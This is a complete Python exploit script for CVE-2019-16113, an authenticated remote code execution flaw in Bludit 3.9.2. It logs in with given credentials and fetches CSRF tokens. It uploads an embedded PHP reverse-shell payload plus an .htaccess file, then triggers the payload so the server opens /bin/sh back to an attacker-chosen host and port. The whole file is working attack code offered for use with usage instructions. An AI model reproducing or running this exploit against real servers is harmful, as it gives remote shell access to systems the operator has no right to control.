import requests, random, string, sys, re
from bs4 import BeautifulSoup


if len(sys.argv) != 6:
    print("* CVE-2019-16113 | Bludit 3.9.2 - Authenticated RCE *\n")
    print("Usage: python3 exploit.py <rhost> <username> <password> <lhost> <lport>")
    print("Example: python3 exploit.py  http://10.10.10.10 root toor 127.0.0.1 1337")
    sys.exit()


rhost = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = sys.argv[5]


def gen_random_charset():
    """
    This function is used to create a random charset.
    """
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(10))


session = requests.Session()


def login(target, username, password):
    """
    This function uses username and password to log into the target and uses the global session variable to carry out this operation.
    """
    csrf_token = get_csrf_token(target)

    login_status = ''
    try:
        request = session.post(target, data={'tokenCSRF':csrf_token, 'username': username, 'password': password})
        if "<title>Bludit - Dashboard</title>" in str(request.text):
            login_status = "[ + ] Login succeed... We are good to go :)"
        else:
            sys.exit("[ - ] Login failed, make sure the credentials are correct, exiting.")

    except Exception as e:
        print("[ ! ] ERROR: ", e)
        sys.exit()

    return login_status


def get_csrf_token(url):
    """
    This function is used to get CSRF token from the target.
    """
    request = session.get(url)
    csrf_token = ""
    html = BeautifulSoup(request.text, "html.parser")
    token = html.find('input', {'name': 'tokenCSRF'}).get('value')

    if token:
        csrf_token = token
    else:
        sys.exit("CSRF Token was not found, exiting.")
    return csrf_token


def shell_upload(payload, payload_name, target, csrf):
    """
    This function is used to upload shell.
    """
    csrf_token = get_csrf_token(csrf)
    file = {'images[]': (payload_name, payload), 'uuid': (None, ''), 'tokenCSRF': (None, csrf_token)}
    try:
        upload = session.post(target, files=file)
        if upload.status_code == 200:
            print(f"[ + ] The payload {payload_name} has been uploaded.")
        else:
            print(f"[ - ] Something went wrong with uploading {payload_name}")
    except Exception as e:
        print(f"[ ! ] An exception occured: {e}")
        sys.exit()


def execute(shell_url):
    """
    This function allows user to execute commands
    """
    print(f"Attempting to get a shell @: {shell_url}")
    try:
        check_shell = session.get(shell_url, timeout=20)
        if check_shell.status_code == 200:
            sys.exit("[ + ] We have a shell, check your listener pal :)")
        else:
            sys.exit("[ ! ] Something went wrong, I can't connect to the shell, exiting.")
    except requests.exception.Timeout:
        sys.exit(f"[ + ] You should be getting a shell by now, if not open {shell_url}")


payload_name = f"{gen_random_charset()}.php"
login_url = f'{rhost}/admin/login'
upload_url = f'{rhost}/admin/ajax/upload-images'
csrf_token = f'{rhost}/admin/new-content'
shell_url = f'{rhost}/bl-content/tmp/{payload_name}'

payload_php = r"""<?php set_time_limit(0);$VERSION="1.0";$ip='%s';$port=%s;""" % (lhost, lport)
payload_php += """$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';$daemon=0;$debug=0;if (function_exists('pcntl_fork')){$pid = pcntl_fork();if($pid==-1){printit("ERROR: Can't fork");exit(1);}if($pid){exit(0);}if(posix_setsid()==-1){printit("Error: Can't setsid()");exit(1);}$daemon = 1;}else{printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");}chdir("/");umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock){printit("$errstr ($errno)");exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe", "w"));$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) {printit("ERROR: Can't spawn shell");exit(1);}stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit("Successfully opened reverse shell to $ip:$port");while (1) {if (feof($sock)) {printit("ERROR: Shell connection terminated");break;}if (feof($pipes[1])) {printit("ERROR: Shell process terminated");break;}$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);if (in_array($sock, $read_a)) {if ($debug) printit("SOCK READ");$input = fread($sock, $chunk_size);if ($debug) printit("SOCK: $input");fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {if ($debug) printit("STDOUT READ");$input = fread($pipes[1], $chunk_size);if ($debug) printit("STDOUT: $input");fwrite($sock, $input);}if (in_array($pipes[2], $read_a)) {if ($debug) printit("STDERR READ");$input = fread($pipes[2], $chunk_size);if ($debug) printit("STDERR: $input");fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) {if (!$daemon) {print "$string\n";}}?>"""

htaccess = 'RewriteEngine on\nRewriteRule ^.*$ -'

print(login(target=login_url, username=username, password=password))
print(70 * '-')
shell_upload(payload=payload_php, payload_name=payload_name, target=upload_url, csrf=csrf_token)
shell_upload(payload=htaccess, payload_name='.htaccess', target=upload_url, csrf=csrf_token)
print(70 * '-')
execute(shell_url=shell_url)


